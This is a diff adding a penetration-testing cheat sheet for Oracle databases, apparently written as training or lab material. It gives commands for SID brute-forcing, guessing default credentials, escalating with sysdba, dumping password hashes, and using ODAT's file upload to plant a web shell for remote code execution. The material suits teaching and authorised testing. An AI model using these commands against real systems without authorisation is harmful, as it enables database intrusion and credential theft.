@@ -1,0 +1,106 @@
+---
+title: "Oracle TNS / RDBMS Cheat Sheet"
+---
+
+## Overview
+
+Oracle Database is a heavyweight enterprise RDBMS, reached over **TCP 1521** through the **TNS Listener** (Transparent Network Substrate). The same logic as any database applies — it holds valuable data and can often be leveraged into OS command execution — but Oracle has a quirk that shapes the whole attack: **you must know the database's SID (instance name) before you can talk to it**, and you typically have to *discover* that first.
+
+<Info>
+**The TNS Listener = a switchboard**
+
+Think of the listener as a receptionist sitting in front of one or more database instances. You connect to 1521 and say "I want instance `XE`"; the listener routes you to it. No valid SID, no connection — which is why **SID enumeration** is the mandatory first step on Oracle.
+</Info>
+
+<Info>
+**Why Oracle is a strong target**
+
+Default credentials are rampant (`scott/tiger`, `sys/change_on_install`, `dbsnmp/dbsnmp`), a privileged login can dump all DB password hashes, and tools like **ODAT** can turn DBA access into **file upload → web-shell RCE** on the host.
+</Info>
+
+---
+
+## Key concepts & files
+
+- **SID (System Identifier)** — the unique name of a specific database instance (`XE`, `ORCL`). Required to connect.
+- **Default creds to always try:** `scott/tiger`, `dbsnmp/dbsnmp`, `sys/CHANGE_ON_INSTALL`.
+
+Configuration files (in `$ORACLE_HOME/network/admin`) that matter if you get on the host:
+
+| File | Side | Description |
+|---|---|---|
+| `listener.ora` | Server | Configures the listener — ports, SIDs it serves, allowed IPs |
+| `tnsnames.ora` | Client | Oracle's "DNS" — maps names like `ORCL` to IP/port/protocol |
+| `PlsqlExclusionList` | Server | Admin blacklist preventing certain PL/SQL packages from running |
+
+---
+
+## Footprinting & SID enumeration
+
+<Tip>
+**You can't do anything until you know a valid SID — start here.**
+
+</Tip>
+
+```bash
+sudo nmap -p1521 -sV <IP> --open                          # version + confirm listener
+sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # brute-force SIDs
+
+# ODAT (Oracle Database Attacking Tool)
+python3 odat.py sidguesser -s <IP> -p 1521                 # find valid SIDs
+python3 odat.py passwordguesser -s <IP> -p 1521 -d XE      # brute creds for SID XE
+python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack module
+```
+
+---
+
+## Connecting (SQL*Plus)
+
+```bash
+sqlplus <user>/<pass>@<IP>/<SID>                # standard login
+sqlplus scott/tiger@10.129.204.235/XE
+
+sqlplus <user>/<pass>@<IP>/<SID> as sysdba      # escalate to DBA at login if allowed
+```
+
+<Info>
+**The `as sysdba` trick**
+
+If an account has been granted the `SYSDBA` privilege, adding `as sysdba` logs you in with full DBA rights immediately — a common and powerful misconfiguration.
+</Info>
+
+Useful queries (end with `;`):
+
+| Command | Description |
+|---|---|
+| `SELECT table_name FROM all_tables;` | Tables the current user can see |
+| `SELECT * FROM user_role_privs;` | Your roles/privileges (are you DBA?) |
+| `SELECT name, password FROM sys.user$;` | **(DBA)** dump all DB password hashes |
+
+---
+
+## Post-exploitation → RCE (ODAT)
+
+<Warning>
+**DBA access → web shell on the host**
+
+With high privileges (e.g. `SYSDBA`), ODAT's `utlfile` module writes a file to disk. Drop a web shell into the web root and you have OS-level RCE.
+</Warning>
+
+```bash
+echo "test" > testing.txt
+python3 odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba \
+  --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt   # Windows web root
+# Linux web root: /var/www/html
+curl http://<IP>/testing.txt                                  # verify
+```
+
+---
+
+## Key Takeaways
+
+- Oracle is reached via the **TNS Listener on 1521**; you **must discover a valid SID** before connecting — enumerate it first (`oracle-sid-brute`, `odat sidguesser`).
+- **Default credentials** (`scott/tiger`, `sys/change_on_install`, `dbsnmp/dbsnmp`) work shockingly often — try them, then `passwordguesser`.
+- Connect with `sqlplus user/pass@IP/SID`; `as sysdba` escalates to full DBA if the account is privileged.
+- DBA access lets you **dump password hashes** (`sys.user$`) and, via **ODAT `utlfile`**, write a web shell → **OS RCE**.
+- On the host, `listener.ora` / `tnsnames.ora` reveal SIDs and connection details.
